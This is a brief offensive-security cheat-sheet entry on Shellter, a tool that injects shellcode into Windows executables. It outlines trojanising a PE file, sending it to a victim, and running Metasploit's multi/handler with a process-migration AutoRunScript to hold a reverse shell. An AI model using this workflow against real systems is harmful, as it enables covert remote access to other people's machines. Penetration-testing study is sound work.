# Shellter

> Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. It can be used in order to inject shellcode into native Windows applications.

Once Shellter is spawned we can set Automatic or Manual mode. Once selected the mode, we will provide a PE which the Shellter will embed our payload. After transfering the malicious PE to the victim, we can set up a listener along with an AutoScript to migrate into another proccess to grain a reverse shell:

```bash
use multi/handler

set payload $PAYLOAD

set AutoRunScript post/windows/manage/migrate
```

**Note:** Some PE will show an integrity check error when executed.Take this in mind.
